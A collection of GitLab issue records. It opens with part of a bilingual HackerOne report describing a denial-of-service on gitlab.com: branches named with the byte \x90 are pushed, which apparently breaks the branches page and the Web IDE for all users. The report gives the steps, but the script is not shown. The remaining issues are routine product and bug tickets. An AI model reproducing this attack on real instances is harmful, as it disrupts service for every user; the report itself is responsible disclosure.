Con esto es suficiente para que la pagina de `/-/branches`  no este disponible para todos los usuarios, además de afectar también el funcionamiento de `Web IDE`. Cabe destacar que el script esta preparado para efectuar esta misma operación de forma recursiva, si usted ejecuta por ejemplo `exploit 5` estaría empujando cinco ramas con el carácter hexadecimal `\x90` quedando ``branch1=\x90` `branch2=\x90\x90` `branch3=\x90\x90\x90` ..., y así sucesivamente dependiendo del valor del argumento de la función `exploit $1`, causaría el mismo daño solo que con mas ramas.

Resultado : https://gitlab.com/user_V/pocdos/-/branches  

_Translated by Google_

__4) __ From a terminal and with the __bash__ interpreter, execute the command `exec bash` to refresh the file.

__5) __ Now being inside the folder of the project that you have cloned, execute the function `exploit 1`

This is enough so that the `/ - / branches` page is not available to all users, as well as affecting the operation of` Web IDE`. It should be noted that the script is prepared to perform this same operation recursively, if you execute for example `exploit 5` you would be pushing five branches with the hexadecimal character` \ x90` leaving `` branch1 = \ x90` `branch2 = \ x90 \ x90` `branch3 = \ x90 \ x90 \ x90` ..., and so on depending on the value of the argument of the` exploit $ 1` function, it would cause the same damage only as with more branches.
 
   
#####  What is the current *bug* behavior?  
Después de empujar una rama con el nombre de `\x90`, la ruta `/-/branches` no estará disponible para todos los usuarios, además `Web IDE` no funciona correctamente.  

After pushing a branch with the name of `\ x90`, the path` / - / branches` will not be available to all users, also `Web IDE` does not work properly.
 
   
#####  What is the expected *correct* behavior?  
La aplicación no debería decodificar estos caracteres. (\x90)  

The application should not decode these characters. (\ x90)
 
   
#####  Relevant logs and/or screenshots  
![screen1.png](https://h1.sec.gitlab.net/a/3058df0e-4c9e-4cd2-a4c4-4513ffb240ca/screen1.png)

![screen2.png](https://h1.sec.gitlab.net/a/cc26cc1e-9629-4051-8a3e-f482463c8f9d/screen2.png)  
 

__Poc Video__:

![poc.mp4](https://h1.sec.gitlab.net/a/80dad43e-6de6-44b1-b5a1-84073b68e357/poc.mp4)

#####  Output of checks

This bug happens on GitLab.com  
 
 

####  Impact

Todos los usuarios no podrán acceder `/-/branches` y tendrán problemas para utilizar la función de `Web IDE` a través de gitlab.com

All users will not be able to access `/ - / branches` and will have trouble using the` Web IDE` function via gitlab.com

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [poc.mp4](https://h1.sec.gitlab.net/a/80dad43e-6de6-44b1-b5a1-84073b68e357/poc.mp4)
* [screen1.png](https://h1.sec.gitlab.net/a/3058df0e-4c9e-4cd2-a4c4-4513ffb240ca/screen1.png)
* [screen2.png](https://h1.sec.gitlab.net/a/cc26cc1e-9629-4051-8a3e-f482463c8f9d/screen2.png)

title: Pipeline status shows success without considering warnings
description:
## Problem When a pipeline uses a bridge job with `allow_failure: true` and the downstream pipeline fails, the upstream bridge job shows as failed. However, the related stage and pipeline show as `success`. This confuses users making them think that there is something wrong with the pipeline processing. ### Steps to reproduce ```yaml build: stage: build script: echo test: stage: test script: echo trigger: stage: test trigger: include: child.yml strategy: depend allow_failure: true # in child.yml build: script: exit 1 ``` This configuration should cause a pipeline and Test stage to have `success` status ## Expected behavior The pipeline and stage should show `success with warnings` status because the bridge job fails with `allow_failure: true`. ## Solution From https://gitlab.com/gitlab-org/gitlab/-/issues/292211#note_462212352: The problem with the stage is [located here](https://gitlab.com/gitlab-org/gitlab/-/blob/2392290c6165d7464aa3b1437e0cb45dfc5c9f3f/app/models/ci/stage.rb#L121), where we use `Ci::Build` to look for jobs with warnings. This would not consider `Ci::Bridge` jobs which is the case of `trigger:`. We should replace `Ci::Build` with `CommitStatus` as we do [for LegacyStage](https://gitlab.com/gitlab-org/gitlab/-/blob/6fa7ab7496ffe6c7febe5aeb14be8ed3060cd300/app/models/ci/legacy_stage.rb#L63). Same problem with pipelines: https://gitlab.com/gitlab-org/gitlab/-/blob/b08717a8dc941140c0e1ffc5a9776fe35ff97101/app/models/ci/pipeline.rb#L660 (we use `Ci::Build` instead of `CommitStatus` which is more generic).
Original description for reference ### Summary In a parent-child pipeline setup where the [trigger](https://docs.gitlab.com/ee/ci/yaml/#trigger) strategy is set to `depend`, the parent pipeline succeeds even though some of its child pipelines fail. The child pipelines belong to external projects. ### Steps to reproduce Based on the [Example project](#example-project) where this occurred, it should be possible to reproduce the bug by doing the following: 1. create a project with a parent pipeline that triggers child pipelines in external projects 1. set the `trigger:strategy` to `depend` 1. ensure the child pipeline fails 1. trigger the parent pipeline ### Example Project https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium-maven/-/pipelines/226618612 See [CI template](https://gitlab.com/gitlab-org/security-products/ci-templates/-/blob/b69f12d93805c47e727c2ad321224cd68f9c0d18/includes-dev/analyzer.yml#L227), [job template](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium-maven/-/blob/2f14dd954ed080d3079a814fc59dba9a9a85bef4/.gitlab-ci.yml#L29), and [job definition](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium-maven/-/blob/2f14dd954ed080d3079a814fc59dba9a9a85bef4/.gitlab-ci.yml#L92). ### What is the current *bug* behavior? parent pipeline succeeds ### What is the expected *correct* behavior? parent pipeline fails ### Relevant logs and/or screenshots ![Capture_d_écran_2020-12-08_à_10.26.41](/uploads/2e80a75bc39de6a160f1c0c5ab0d1820/Capture_d_écran_2020-12-08_à_10.26.41.png) ![Capture_d_écran_2020-12-08_à_10.27.09](/uploads/d69cf834e15c7e08b5e2da2e83c525bc/Capture_d_écran_2020-12-08_à_10.27.09.png) ### Output of checks #### Results of GitLab environment info
Expand for output related to GitLab environment info 

(For installations with omnibus-gitlab package run and paste the output of:
`sudo gitlab-rake gitlab:env:info`)

(For installations from source run and paste the output of:
`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)
#### Results of GitLab application Check
Expand for output related to the GitLab application check 

(For installations with omnibus-gitlab package run and paste the output of:
`sudo gitlab-rake gitlab:check SANITIZE=true`)

(For installations from source run and paste the output of:
`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)

(we will only investigate if the tests are passing)
### Possible fixes
/cc @fabiopitino /cc @gitlab-org/secure/composition-analysis-be

title: Release Dependency Scanning Docker images compatible with OpenShift
description:
### Problem to solve 

While working on [Engineering discovery: allow secure analyzer docker containers to run as a non-root user to support OpenShift](https://gitlab.com/gitlab-org/gitlab/-/issues/281816), a number of merge requests were created to update the following secure analyzers so they now run as a non-root user:

* bundler-audit
* gemnasium
* gemnasium-maven
* gemnasium-python
* retire.js

However, it was not possible to merge and release new analyzers because we were unable to test them in an offline or OpenShift environment. Once we're able to complete these tests, we should merge and release these **OpenShift-compatible** analyzers ~~running as non-root~~.

### Intended users

* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)

### Proposal
 
When the following issues have been completed:

1. [x] [Test secure analyzers running as non-root user in OpenShift environment](https://gitlab.com/gitlab-org/gitlab/-/issues/290240)
1. [NA] ~~[Test secure analyzers running as non-root in automated offline testing environment](https://gitlab.com/gitlab-org/quality/team-tasks/-/issues/695)~~

We need to merge and release the following analyzers:

* [x] bundler-audit
* [x] gemnasium
* [x] gemnasium-maven
* [x] gemnasium-python
* [x] retire.js

See MRs listed in https://gitlab.com/gitlab-org/gitlab/-/issues/290240

### Documentation

Documentation will be handled in [Document limitations of secure analyzers which run as non-root user](https://gitlab.com/gitlab-org/gitlab/-/issues/292206), and should be released right after the above analyzers have been merged.

### Availability & Testing

See https://gitlab.com/gitlab-org/gitlab/-/issues/290240

### What does success look like, and how can we measure that?

The following analyzers are compatible with OpenShift:

* bundler-audit
* gemnasium
* gemnasium-maven
* gemnasium-python
* retire.js

### What is the type of buyer?

~"GitLab Ultimate" ~"Enterprise Edition" 

### Is this a cross-stage feature?

<!-- Communicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group. Loop in the most relevant PM and Product Designer from that Group to provide strategic support to help align the Group's broader plan and vision, as well as to avoid UX and technical debt. https://about.gitlab.com/handbook/product/#cross-stage-features -->

title: Document limitations of secure analyzers which run as non-root user
description:
### Problem to solve

During [Engineering discovery: allow secure analyzer docker containers to run as a non-root user to support OpenShift](https://gitlab.com/gitlab-org/gitlab/-/issues/281816), it was determined that switching to a non-root user may introduce a breaking change for users that have configured a `before_script` which relies on root privileges. 

We need to update the [Dependency Scanning documentation](https://docs.gitlab.com/ee/user/application_security/dependency_scanning) to document this behaviour change.

### Proposal

The purpose of this issue is to add details to the [Dependency Scanning documentation](https://docs.gitlab.com/ee/user/application_security/dependency_scanning) to explain:


1. Which analyzers are now running as non-root user
1. Which version of each analyzer was responsible for this behaviour change
1. Some of the caveats/drawbacks of switching to a non-root user, such as custom `before_script` directives no longer working if they rely on root access
1. Possible workarounds

### Who can address the issue

~"group::composition analysis" 

### Other links/references

https://gitlab.com/gitlab-org/gitlab/-/issues/281816

title: Docs feedback: DAST API Scanning should warn about host overrides
description:
https://docs.gitlab.com/ee/user/application_security/dast/#import-api-specification-from-a-file does not make any mention that passing in `/analyze -t $DAST_WEBSITE` does not actually override the Host/Server section of the OpenAPI document. This could lead to users accidentally scanning sites they do not own.

Suggested fix:
If your API specification is in your repository, you can provide the specification’s filename directly as the target. The specification file is expected to be in the /zap/wrk directory. Passing in the `-t $DAST_WEBSITE` will *not* override the server variable that is defined in the `api-specification.yml`. Ensure the `api-specification.yml` contains the valid hostname which you expect to scan.
```
dast:
  script:
    - mkdir -p /zap/wrk
    - cp api-specification.yml /zap/wrk/api-specification.yml
    - /analyze -t $DAST_WEBSITE
  variables:
    GIT_STRATEGY: fetch
    DAST_API_SPECIFICATION: api-specification.yml
```

Additionally it should be mentioned that https://docs.gitlab.com/ee/user/application_security/dast/#host-override Host override, while mentions it is not supported when importing API from file, it should be in a warn/alert style box to draw more attention to it.


### Proposal

- [ ] Update the import specification from file [documentation](https://docs.gitlab.com/ee/user/application_security/dast/#import-api-specification-from-a-file)
  - Remove the `/analyze -t [target]`. Specifying a target and an API specification is not supported.
  - This the script to copy the file to `/zap/wrk` can likely be converted to a `before_script`. This should be verified before the documentation is updated.
- [ ] Update DAST to throw an error when a target and an API specification is provided
- [ ] Update DAST to throw an error when the API specification is a file and a host override is supplied

title: Allow the user to exclude a parameter for API Fuzzing
description:
### Problem

A user wants to exclude a parameter from testing. Parameter could be any supported (header, path, querystring, etc.). This can happen when a field always causes an API failure, or a finding that will not be fixed.

### Proposal

Add the following two variables:

- `DAST_API_EXCLUDE_PARAMETER_ENV={json}` User can provide the json as a string
- `DAST_API_EXCLUDE_PARAMETER_FILE=exlude_parameters.json` User can provide the json as url/file
- Error if both are set

Use a json format similar to overrides to allow users to define parameters to skip during testing:

```json
{
  "headers": [
    "header1",
    "header2"
  ],
  "cookies": [
    "cookie1",
    "cookie2"
  ],
  "query": [
    "query-string1",
    "query-string2"
  ],
  "body-form": [
    "form-param1",
    "form-param2"
  ],
  "body-json": [
    "json-path1",
    "json-path2"
  ],
  "body-xml" : [
    "xpath1",
    "xpath2"
  ]
}
```

Add a section to the worker-entry output to list excluded parameters.

### Tasks

1. [x] Worker-Entry
   1. [x] Add new variables (`_EXCLUDE_PARAMETER_ENV` and `_EXCLUDE_PARAMETER_FILE`)
   1. [x] Error when the two are variables are set at the same time
   1. [x] If a file is given, then check it can be loaded and it JSON. If not throw proper error (file can use BasePath)
   1. [x] If the content is given, check JSON can be loaded. If not then throw proper error
   1. [x] Use RunnerOptions to pass over the scanner the exclude parameter config.
   1. [x] Add a new section in the worker-entry final report. Listing the excluded parameters
1. [ ] Scanner/Runner
   1. [x] Load exclude parameter config. If a file path is used, then it can use BasePath settings to locate the file.
   1. [x] Exclude parameters **TDB** 
1. Tests
    1. [x] Add integration test in worker-entry to check error when the two variables are set
    1. [x] Add integration test in worker-entry to check when file does not exist or cannot be downloaded
    1. [x] Add integration test in worker-entry to check when the file content is not a valid  JSON
    1. [x] Add integration test in worker-entry excluding each type of parameter. 
       1. [x] Matching (for XML take into account custom namespaces)
       1. [x] Non-Matching

title: Add a "Merge Train" label to pipelines created by the merge train process
description:
### Release notes

<!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). " -->

### Problem to solve 

When you add an MR to a Merge Train, new pipelines are created that are not triggered by commits or anything else, but these pipelines are hard to differentiate in the pipeline list for an MR (or a project). If you aren't extremely familiar with the feature, multiple "cancelled" pipelines (due to the merge train needing to restart because an earlier MR was dropped from the train) can look concerning, and have driven calls to support.

For example, I see multiple cancelled pipelines, which may drive me to create a support ticket saying my pipelines are mysteriously "failing" or "restarting":

- ![Screen_Shot_2020-12-07_at_18.13.48](/uploads/3f800713a3148788123c00f36be6fb9f/Screen_Shot_2020-12-07_at_18.13.48.png)

### User experience goal

All users should be able to check the pipelines tab at a glance, and understand that the cancelled pipelines were due to a properly functioning Merge Train, and not due to any problem in the MR.

### Proposal

For "Merge Train" pipelines, add a label `Train` with a popup on hover that explains labels is for `Merge Train`.

It should look like the following badges that already exist (e.g., `Scheduled` or `Detached`, etc.):

![Screen_Shot_2020-12-08_at_9.03.19](/uploads/758e1015269488815bb725426674a679/Screen_Shot_2020-12-08_at_9.03.19.png)

title: Group migration MVC - User Documentation
description:
## User documentation proposal

We need to clearly document the GitLab Group Migration functionality available as of the completion of the [MVC epic](https://gitlab.com/groups/gitlab-org/-/epics/4374), as a distinct feature from the [Group Import from an export file](https://docs.gitlab.com/ee/user/group/settings/import_export.html).

The feature should be labeled as `beta`, explicitly calling out the fact that it is bare-bones and may not be useful enough for most users. Please consider the example on this page for the warning box treatment: https://docs.gitlab.com/ee/development/bulk_import.html

This message should be used for the warning text:  
"Caution: This feature is under development and currently migrates only some of the Group data. Please see below for the full list of what is included in the migration at this time."

The document should then clearly list which attributes of a Group are currently included in the migration, with an explicit note that anything not mentioned in the list is **not included**.

title: Update to criteria for displaying email in Seats in Use table
description:
## Summary

This is a follow-up issue to https://gitlab.com/gitlab-org/gitlab/-/issues/268265, where [we learned](https://gitlab.com/gitlab-org/gitlab/-/issues/268265#note_460106049) that Group Managed Accounts has been deprecated. As a result, we will likely not show email address for many users in the new users table. 

Backend decision to utilize Group Managed Accounts reference: https://gitlab.com/gitlab-org/gitlab/-/issues/217384#note_416328911

## Proposal

Let's revert to the [original intention](https://gitlab.com/gitlab-org/gitlab/-/issues/216899#additional-information) of displaying user's email address in this table only when the user has elected to make their email address Public in profile settings.

Only display email if the user has elected to publicly display it:

title: Split shared CI config of the Secure analyzer projects
description:
## Summary

Split the [shared CI config](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/master/includes-dev/analyzer.yml) used by the Secure analyzer projects implemented in Go to make it composable, and create one CI template per CI stage.

The existing [analyzer.yml](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/master/includes-dev/analyzer.yml) remains for backward compatibility, but it simply includes the new files using the `include:local` keyword.

## Improvements

After being split, the shared CI config can be used by projects that only need specific stages, or by projects having parent-child pipelines. See https://gitlab.com/gitlab-org/gitlab/-/issues/198361 for use case.

## Risks

None since the change is fully backward compatible. Also, this only affects the build of the analyzer projects and cannot impact end users.

## Involved components

https://gitlab.com/gitlab-org/security-products/ci-templates/blob/master/includes-dev/analyzer.yml

title: Convert the "Assignees" feature into a widget
description:
The goal for this is to have a sample widget that's reused across issue types and we can write technical docs for building these widgets.

### Possible requirements:

1. On the backend, changing a flag or the contents of the array of widgets should hide this widget from a specific issue type.

   This prepares us for custom issue types and this means that everything already depends on the backend for this widget's visibility.

1. Provide hooks that get executed when this widget is added / removed

   This is useful when we want to support switching types. So that when an issue is switched into a type that does not have assignees, the "remove" hook must be triggered and vice versa.

   This is needed so that we can remove the data when the widget is removed so that the issues don't show up in the issue list when filtering by assignee.

### Acceptance Criteria

- Update https://docs.gitlab.com/ee/development/issue_types.html to reflect the current status of issue types, reference architectures for widgets, how to create a new type, and so on.

## Availability and Testing

Manual job `package-and-qa` will need to be run in the MR to ensure e2e tests do not break.

Currently, the Environments page sorts the list of deployments by the most recent commit SHA change. To make it easier to view deployments over time, we have changed the default sorting order of this list to be by deployment itself rather than the most recent commit. You can now see the most recent deployment at the top of the page and the rest of your deployments in descending order by deployment date.

title: Update secrets analyzer to use GitLeaks v7.2.0
description:
<!-- This template is a great use for issues that are feature::additions or technical tasks for larger issues.-->

### Proposal 
Gitleaks recently released a major version that includes some nice features that will reduce the amount of [pre-processing](https://gitlab.com/gitlab-org/security-products/analyzers/secrets/-/blob/master/analyze.go#L45-56) the Secrets Analyzer has to do. Two features the analyzer could make use of: `--no-git`, and `LeakURL`. v7.0.0 also includes a fix for the wrong line number reported in https://gitlab.com/gitlab-org/gitlab/-/issues/287696.

v7.1.0 introduced `--leaks-exit-code=` which means we can remove the extra exit code processing [here](https://gitlab.com/gitlab-org/security-products/analyzers/secrets/-/blob/master/gitleaks/gitleaks.go#L168-181)

v7.1.1 fixes a bug with allowlists which is essential for our analyzer.


### Implementation
- [x] Update Dockerfile to pull gitleaks v7.2.0
- [x] Update the [analyze](https://gitlab.com/gitlab-org/security-products/analyzers/secrets/-/blob/master/analyze.go#L58-63) and gitleaks [Run](https://gitlab.com/gitlab-org/security-products/analyzers/secrets/-/blob/master/gitleaks/gitleaks.go#L110) function to be compliant with v7.2.0.
- [x] Update tests

title: Packages list: update the pipeline metadata
description:
### Context

Currently, the UI in the packages list displays (if present) the data of the pipeline that created the package:

![Screenshot_2020-12-07_at_15.05.05](/uploads/1fb1f89541dc5a51a79ef249dca86131/Screenshot_2020-12-07_at_15.05.05.png)

With a recent update, we are now able to fetch from the server all the pipelines associated with a package, and we are already using this info on the details page.


We should discuss and decide if is more valuable to show the last pipeline associated with the package and consequently update the `Created X days ago` line to `Updated X days ago`

It's important to remember that:

- not all the packages have pipelines
- not all the packages have more than one pipeline
- not all the package manager supports multiple uploads for a package (for example npm does not)

### Proposal

If a package has been updated by more than one pipeline, display the latest available pipeline to help users see the most recent update.

title: Snippets: Fail to properly clone repo with custom initial branch name
Alert message in MRs “Error occurred while fetching…” appears too often and isn't helpful
description:
The error alert message `Error occurred while fetching…` or `Something went wrong while fetching…` appears too often and isn't necessarily helpful. To be honest, it just makes the product feels unstable and buggy.

I couldn't accurately pin down the conditions that trigger this alert. But I noticed that it sometimes appears:
1. If you navigate away from the MR page before it has been fully loaded.
1. When the page has been left idle for a while.
1. There are likely other cases…

Here are some examples:

![image](/uploads/d997f6d11a3117f02462e07ff19b5857/image.png)

![image](/uploads/4c6f46390c8a34e73f76b32c1681f66b/image.png)

This is an example from an issue, but I think it also happens in MRs:

![image](/uploads/02b42e5a719d305eed7e1c15ebf6a851/image.png)

# Proposal

Improve error handling for **polling** request errors — the theory being that this is the big majority of cases triggering the error (when user is away from tab, etc.)

* Upon error, silently retry within a few seconds.
* Show the current error only after 2 **sequential** failures (e.g. reset the counter if there's a success in between)
* Dismiss that error upon the next successful request

Update: any visual tweaks will be handled in a follow-up (to be created).

These visual tweaks may include:
- Text update (e.g. "The periodic update of this merge request is currently paused.")
- Success message (e.g. "This merge request is now updating with live data again")
- Use a GLUI notification component (exclusive with below)
- Use a Toast notification (exclusive with above)

epic.title: 🐛 Fix Transient Bugs for Merge Requests

title: Lift the NPM package naming convention for the project level API
description:
### Current situation

Our current `npm` API enforces a [naming convention](https://docs.gitlab.com/ee/user/packages/npm_registry/#package-naming-convention). This naming convention has some problems as it is too restrictive to some users or ~"self-managed" instances.

The implementation has been done before my time but I think that the naming convention is mainly used to locate the proper package when hitting the instance level API. Basically, the ~backend  receives: hey, I need package `X` and that's it, no group id, no project id. With the only information of the package name, the ~backend has to accurately locate the package within all projects accessible for the current user.

This naming convention is implemented as a [model validator](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/models/packages/package.rb#L37), which means that before a npm package is saved to the database, the package name has to be conform to the naming convention, which means that *all* npm packages need to be ok with that convention.

### Proposal 

Use the same approach as we have in the [Maven API](https://docs.gitlab.com/12.10/ee/user/packages/maven_repository/#configuring-your-project-to-use-the-gitlab-maven-repository-url):

* At the Project level
   * Don't impose any naming restriction. Users are free to use whatever they want, including not using an `@scope` at all.
* At the Instance level
   * Similar to [maven](https://docs.gitlab.com/12.10/ee/user/packages/maven_repository/#instance-level-maven-endpoint), *only* the packages that follow the naming convention are exposed via this API level.
   * If a package doesn't follow the naming convention, it can't be retrieved with the instance level API.

### Other considerations

If one day, we ever implement the Group level API, I think we can follow again what we have for the [Maven api](https://docs.gitlab.com/12.10/ee/user/packages/maven_repository/#configuring-your-project-to-use-the-gitlab-maven-repository-url):
* At the Group level
   * Don't impose any naming convention
   * What about duplicated package names? Use the same strategy as on the Maven API:

> The group level endpoint works with any package names, which means the you have the flexibility of naming compared to instance level endpoint. However, GitLab will not guarantee the uniqueness of the package names within the group. You can have two projects with the same package name and package version. As a result, GitLab will serve whichever one is more recent. 

### Work complexity

It should be quite low as we "only" have:
* remove the model validator
* make sure that the instance level API locate the package using the naming convention (should be already the case, so nothing to do).
* make sure that the project level API works with any package name (rspec example)
* make sure that the instance level API works with *only* package names that follow the naming convention (rspec example)

title: Remove the merge manually message from MRs
description:
This is an actionable insight from the [UX Department: MRs experience async critique](https://gitlab.com/gitlab-org/ux-research/-/issues/1073) research ([insight][insight]).

### What

In the merge request widget, below the **merge** section, the message `You can merge this merge request manually using the command line` is almost always displayed, even when merging is blocked or the current user doesn't have permissions.

Here are a few cases:

1. There are conflicts and the current user can't merge it locally:
   ![image](/uploads/bb9034575e327185e47851fdfc7750c0/image.png)
1. The pipeline has failed and must succeed to be able to merge (from https://gitlab.com/gitlab-org/gitlab/-/issues/291168):
   ![image](/uploads/ced0eed2e8ec903050ad2ea8432b4b11/image.png)
1. When unresolved threads must be resolved
1. When the MR is still in draft
1. When merge trains are enabled
1. And likely other cases where merge isn't possible

Additionally, given the [history of this message](https://gitlab.com/gitlab-org/gitlab/-/issues/291994#note_491935311), it doesn't seem to add value.

### How

Remove the merge manually message.

[insight]: https://dovetailapp.com/projects/14109fbc-dfdd-4204-a54e-9c80ba8b7bba/insights/77cf90af-b89d-4520-89a4-277684714da6

title: Fix usage ping for  `{:"usage_activity_by_stage_monthly.manage.projects_imported.total"=>-1}`
Add iterations and resource events to Import/Export & GitLab Migration
description:
### Release notes

GitLab Migration migrates now [Iteration cadences](https://docs.gitlab.com/ee/user/group/iterations/#iteration-cadences) of groups. If you've been using Iteration cadences to automate creating your iterations or automatically roll over incomplete issues to the next iteration, this information and configuration will be migrated along with your groups.

Documentation: https://docs.gitlab.com/ee/user/group/import

## Original problem 

We currently do not include iterations in our import / export. This also applies to `resource_iteration_events`, `resource_milestone_events`, and `resource_state_events` and iteration board lists.

We need the resource events so that burndown / burnup charts are imported / exported correctly.

I'm not sure how this would work with project exports though because iterations are currently at the group level. Does this mean we cannot include issue iterations and project board iteration lists in our project exports?

## Proposed solution

Iterations are already migrated as part of the GitLab Migration. And so are Issues. What we need to add is the connection. We already do something similar for Epics and Issues (for example).

epic.title: GitLab Migration - Projects Phase 2

title: Unlink Dependency Proxy temp files immediately
description:
## Problem

The [`DependencyProxy::DownloadBlobService`](https://gitlab.com/gitlab-org/gitlab/blob/master/app/services/dependency_proxy/download_blob_service.rb#L12) does not ensure removal of the temp file.

## Solution

It should be cleaned up to take a block and properly clean up the file as we added in the [PullManifestService](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/48845/diffs#2842a0573cf07059df4d3b7dd0c7718876cbcdf3) in !48845

### Update

**Note**:
As mentioned [here](https://gitlab.com/gitlab-com/gl-infra/production/-/issues/5042#note_616918800), the file needs to be unlinked immediately after the `TempFile` is created. We should update the `DependencyProxy::PullManifestService` `TempFile` similarly.

title: Group Level  Deployment Frequency Ci/CD chart
description:
### [Release notes]()

<!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). " -->

We now aggregate the CI/CD Analytics metrics at the group level. In this release we are extending support Deployment Frequency charts at the group level. This will allow users to get a full picture of the deployment frequency across multiple projects and teams, so that they can comprehend their efficiency more accurately.

### Problem to solve

<!-- What problem do we solve? Try to define the who/what/why of the opportunity as a user story. For example, "As a (who), I want (what), so I can (why/value)." -->

As a user, I want to see the available CI/CD metrics in my group page, so I can get aggregated data of all the deployment frequency of all projects in my group and also be able to compare the deployment frequencies between projects.

### Intended users

<!-- Who will use this feature? If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager). It's okay to write "Unknown" and fill this field in later.

* [Simone (Software Engineer in Test)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#simone-software-engineer-in-test)
* [Allison (Application Ops)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#allison-application-ops)

-->

* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager)
* [Dana (Data Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#dana-data-analyst)

### User experience goal

<!-- What is the single user experience workflow this problem addresses?
For example, "The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to <perform a specific task>"
https://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ -->

The user should be able to consume the **number of releases** and **% of projects with releases** in group at the CI/CD Analytics page.

### Proposal

**:star: [`VIEW PROTOTYPES ON FIGMA`](https://www.figma.com/file/DvT2jk9x5fcLKmrY8m2hlc/Measure-DORA-4-Metrics-in-GitLab?node-id=1%3A3702) :star:**

<!-- How are we going to solve the problem? Try to include the user journey! https://about.gitlab.com/handbook/journeys/#user-journey -->

After we implement [Group Level API support for Deployment Frequency](https://gitlab.com/gitlab-org/gitlab/-/issues/291747), [Add charts Deployment Frequency in CI/CD dashboard - Ultimate](https://gitlab.com/gitlab-org/gitlab/-/issues/275991) and [Add CI/CD under the Analytics navigation menu at the group level](https://gitlab.com/gitlab-org/gitlab/-/issues/259697), we can combine them to present deployment frequency at the group level

Design for release metrics which may be reused
<details>
In the `CI/CD` analytics page https://gitlab.com/gitlab-org/gitlab/-/issues/259697:

- User sees an empty state when there are no metrics available to be displayed.
  - A help text and link to the documentation should be available.
- When metrics are available, user sees the analytics information for:
  - Number of releases in group
  - % of projects with releases in Group
</details>

#### Out of scope

Any ~frontend updates on style/UI of components is out of scope.

### Documentation

Yes, this will require documentation updates.

### What does success look like, and how can we measure that?

However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. -->



### Release notes

<!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). " -->

In [gitlab#279039](https://gitlab.com/gitlab-org/gitlab/-/issues/279039) we added support for Deployment frequency at the project level. In this release we are extending support for this API to the group level. This will allow users to get a full picture of the deployment frequency across projects and teams, so that they can comprehend their efficiency more accurately.  

### Problem to solve 

<!-- What problem do we solve? Try to define the who/what/why of the opportunity as a user story. For example, "As a (who), I want (what), so I can (why/value)." -->

As an executive investing in DevOps, I want to see my ROI. I want to see an improvement in the deployment frequency of my dev team. This will most likely drive the KPIs of my team.



I want to import the data from GitLab into an external monitoring tool, so I need API support to poll the data.

### Intended users

<!-- Who will use this feature? If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager). It's okay to write "Unknown" and fill this field in later.
